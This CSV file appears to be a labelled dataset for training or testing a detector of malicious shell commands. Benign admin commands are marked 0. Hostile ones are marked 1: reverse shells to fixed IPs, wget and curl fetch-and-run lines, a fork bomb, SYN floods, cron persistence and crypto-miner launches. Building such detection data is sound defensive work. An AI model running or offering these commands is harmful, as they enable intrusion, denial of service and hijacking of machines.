text,label
cat /etc/nginx/nginx.conf,0
:(){ :|:& };:,1
t50 10.0.0.1 --flood,1
tail -f access.log,0
python3 manage.py runserver,0
tail -f access.log,0
grep error app.log,0
python3 manage.py runserver,0
echo hello,0
nginx -g daemon off;,0
nginx -g daemon off;,0
bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
cd /app && npm start,0
df -h,0
base64 -d payload|bash,1
curl -s http://localhost/health,0
apt-get update,0
crontab -l; echo '* * * * * /tmp/x' | crontab -,1
df -h,0
ls -la /var/log,0
tail -f access.log,0
ls -la /var/log,0
tail -f access.log,0
df -h,0
apt-get update,0
for((;;)); do curl victim; done,1
:(){ :|:& };:,1
base64 -d payload|bash,1
tail -f access.log,0
apt-get update,0
hping3 --flood -S -p 80 10.0.0.5,1
crontab -l; echo '* * * * * /tmp/x' | crontab -,1
ps aux,0
wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
for((;;)); do curl victim; done,1
bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
systemctl status nginx,0
echo hello,0
tail -f access.log,0
wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
python3 manage.py runserver,0
grep error app.log,0
grep error app.log,0
t50 10.0.0.1 --flood,1
systemctl status nginx,0
cat /etc/nginx/nginx.conf,0
python3 manage.py runserver,0
nginx -g daemon off;,0
systemctl status nginx,0
cd /app && npm start,0
:(){ :|:& };:,1
cat /etc/nginx/nginx.conf,0
grep error app.log,0
t50 10.0.0.1 --flood,1
kubectl get pods,0
ps aux,0
cat /etc/nginx/nginx.conf,0
base64 -d payload|bash,1
redis-cli ping,0
df -h,0
:(){ :|:& };:,1
curl http://evil/x|sh,1
echo hello,0
ls -la /var/log,0
chmod +x /dev/shm/miner,1
nginx -g daemon off;,0
echo hello,0
grep error app.log,0
chmod +x /dev/shm/miner,1
hping3 --flood -S -p 80 10.0.0.5,1
chmod +x /dev/shm/miner,1
nc -e /bin/sh 45.9.1.2 4444,1
:(){ :|:& };:,1
bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
curl -s http://localhost/health,0
bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
nc -e /bin/sh 45.9.1.2 4444,1
wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
chmod +x /dev/shm/miner,1
nc -e /bin/sh 45.9.1.2 4444,1
grep error app.log,0
crontab -l; echo '* * * * * /tmp/x' | crontab -,1
xmrig -o stratum+tcp://pool:3333,1
cd /app && npm start,0
hping3 --flood -S -p 80 10.0.0.5,1
wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
nc -e /bin/sh 45.9.1.2 4444,1
systemctl status nginx,0
df -h,0
df -h,0
python3 manage.py runserver,0
apt-get update,0
for((;;)); do curl victim; done,1
xmrig -o stratum+tcp://pool:3333,1
systemctl status nginx,0
grep error app.log,0
curl -s http://localhost/health,0
redis-cli ping,0
systemctl status nginx,0
redis-cli ping,0
ls -la /var/log,0
redis-cli ping,0
cd /app && npm start,0
base64 -d payload|bash,1
kubectl get pods,0
wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
grep error app.log,0
redis-cli ping,0
grep error app.log,0
nginx -g daemon off;,0
crontab -l; echo '* * * * * /tmp/x' | crontab -,1
apt-get update,0
chmod +x /dev/shm/miner,1
grep error app.log,0
base64 -d payload|bash,1
curl http://evil/x|sh,1
bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
hping3 --flood -S -p 80 10.0.0.5,1
df -h,0
nginx -g daemon off;,0
curl -s http://localhost/health,0
crontab -l; echo '* * * * * /tmp/x' | crontab -,1
base64 -d payload|bash,1
ps aux,0
hping3 --flood -S -p 80 10.0.0.5,1
nginx -g daemon off;,0
t50 10.0.0.1 --flood,1
hping3 --flood -S -p 80 10.0.0.5,1
wget http://185.10.68.12/bot -O /tmp/x && chmod +x /tmp/x && /tmp/x,1
bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
python3 manage.py runserver,0
bash -i >& /dev/tcp/1.2.3.4/9001 0>&1,1
t50 10.0.0.1 --flood,1
nc -e /bin/sh 45.9.1.2 4444,1
redis-cli ping,0
xmrig -o stratum+tcp://pool:3333,1
nginx -g daemon off;,0
t50 10.0.0.1 --flood,1
cat /etc/nginx/nginx.conf,0
tail -f access.log,0
df -h,0
echo hello,0
